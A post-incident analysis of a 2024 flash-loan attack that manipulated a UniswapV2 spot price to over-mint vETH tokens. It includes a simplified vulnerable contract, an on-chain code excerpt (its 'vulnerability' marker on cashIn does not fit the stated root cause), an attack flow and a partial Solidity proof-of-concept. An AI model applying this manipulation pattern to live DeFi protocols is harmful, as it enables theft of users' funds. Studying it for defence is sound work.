# vETH — Factory Price Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-13 |
| **Protocol** | vETH Token |
| **Chain** | Ethereum |
| **Loss** | ~447,000 USD |
| **Attacker** | [0x713d2b65](https://etherscan.io/address/0x713d2b652e5f2a86233c57af5341db42a5559dd1) |
| **Attack Tx** | [0x900891b4](https://etherscan.io/tx/0x900891b4540cac8443d6802a08a7a0562b5320444aa6d8eed19705ea6fb9710b) |
| **Vulnerable Contract** | [0x280a8955](https://etherscan.io/address/0x280a8955a11fcd81d72ba1f99d265a48ce39ac2e) |
| **Root Cause** | The vETH Factory's DEX interface directly referenced AMM spot price without TWAP, allowing BIF price manipulation within a single block to over-mint vETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/vETH_exp.sol) |

---
## 1. Vulnerability Overview

The DEX interface (0x19C5538D) of the vETH token factory (0x62f250CF) purchased BIF tokens via the `buyQuote()` function and minted vETH based on that. The price of BIF tokens was dependent on the spot price of a UniswapV2 pair. The attacker borrowed approximately 32,560 ETH via a flash loan from Balancer, artificially manipulated the BIF price, then sold the over-minted vETH to realize profit. The attack occurred across three pairs (vETH-BIF, vETH-Cowbo, vETH-BOVIN).

## 2. Vulnerable Code Analysis

```solidity
// ❌ vETH Factory DEX interface: vETH minting based on spot price
contract VETHDexInterface {
    function buyQuote(address token, uint256 ethAmount, uint256 minOut) external payable {
        // ❌ Calculate token amount using UniswapV2 spot price
        uint256 tokenAmount = getAmountOut(ethAmount, token);  // AMM spot price based
        // ❌ vETH mint amount determined by manipulated price
        uint256 vethAmount = tokenAmount * vethPerToken;
        IvETH(vETH).mint(msg.sender, vethAmount);
    }

    function getAmountOut(uint256 amountIn, address token) internal view returns (uint256) {
        // ❌ Uses getReserves() from UniswapV2 pair — manipulable via flash loan
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(pair).getReserves();
        return amountIn * r1 / r0;
    }
}

// ✅ Fix: Use TWAP or Chainlink oracle
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: VirtualToken.sol
        amountAfterFee = amount - fee;
    }

    function cashIn() external payable onlyWhiteListed {
        _transferAssetFromUser(msg.value);
        _mint(msg.sender, msg.value);  // ❌ Vulnerability
        emit Wrap(msg.sender, msg.value);
    }

    function cashOut(uint256 amount) external onlyWhiteListed returns (uint256 amountAfterFee) {
        uint256 fee = (amount * cashOutFee) / 10000;
        totalCashOutFeesCollected += fee;
        amountAfterFee = amount - fee;

        _burn(msg.sender, amount);
        _transferAssetToUser(amountAfterFee);
        emit Unwrap(msg.sender, amountAfterFee);
    }

    function takeLoan(address to, uint256 amount) external payable nonReentrant onlyValidFactory {
        if (block.number > lastLoanBlock) {
            lastLoanBlock = block.number;
            loanedAmountThisBlock = 0;
        }
        require(loanedAmountThisBlock + amount <= MAX_LOAN_PER_BLOCK, "Loan limit per block exceeded");

        loanedAmountThisBlock += amount;
        _mint(to, amount);
        _increaseDebt(to, amount);

        emit LoanTaken(to, amount);
    }

    function repayLoan(address to, uint256 amount) external nonReentrant onlyValidFactory {
        _burn(to, amount);
        _decreaseDebt(to, amount);

        emit LoanRepaid(to, amount);
    }

    function getLoanDebt(address user) external view returns (uint256) {
        return _debt[user];
    }

    function _increaseDebt(address user, uint256 amount) internal {
        _debt[user] += amount;
    }
```

## 3. Attack Flow

```
Attacker (0x713d2b65)
  │
  ├─[1]─▶ Balancer Vault flash loan: borrow ~32,560 ETH
  │
  ├─[2]─▶ receiveFlashLoan callback:
  │         WETH → ETH conversion
  │         DEX_INTERFACE.buyQuote{value: allETH}(BIF, ...)
  │         └─ Buy BIF with large ETH amount → BIF price spikes
  │
  ├─[3]─▶ Interact with vETH Factory while holding large BIF position
  │         └─ ❌ Over-mint vETH at manipulated high BIF price
  │
  ├─[4]─▶ Sell over-minted vETH on UniswapV2
  │         Attack across 3 pools: vETH-BIF, vETH-Cowbo, vETH-BOVIN
  │
  ├─[5]─▶ Repay Balancer flash loan (~32,560 ETH)
  │
  └─[6]─▶ ~447,000 USD net profit
```

## 4. PoC Code

```solidity
function receiveFlashLoan(
    address[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    uint256 borrowed_eth = amounts[0];
    WETH_TOKEN.withdraw(borrowed_eth);

    // ❌ Buy BIF with large ETH amount to manipulate price
    DEX_INTERFACE.call{value: borrowed_eth}(
        abi.encodeWithSignature("buyQuote(address,uint256,uint256)", address(BIF), borrowed_eth, 0)
    );

    uint256 bif_balance = BIF.balanceOf(address(this));
    // Execute vETH-related operations while BIF price is elevated
    // → Over-mint vETH then sell

    // Repay flash loan
    WETH_TOKEN.deposit{value: borrowed_eth}();
    WETH_TOKEN.transfer(address(vault), borrowed_eth + feeAmounts[0]);
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Oracle Manipulation / AMM Spot Price Dependency |
| **Attack Vector** | Large-scale flash loan + AMM price manipulation + over-minting |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP** | Oracle Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **TWAP Oracle**: Calculate BIF price using UniswapV2 TWAP (minimum 30 minutes)
2. **Chainlink Integration**: Use external price feed to prevent AMM manipulation
3. **Minting Cap**: Set an upper limit on vETH minted per single transaction
4. **Price Deviation Detection**: Block minting when a large deviation from the previous block's price is detected

## 7. Lessons Learned

- A flash loan of 32,560 ETH in scale can manipulate any AMM spot price.
- When vETH minting depends on a manipulable price, the mint amount itself falls under the attacker's control.
- The same vulnerability was exploited simultaneously across three trading pairs, amplifying the total damage.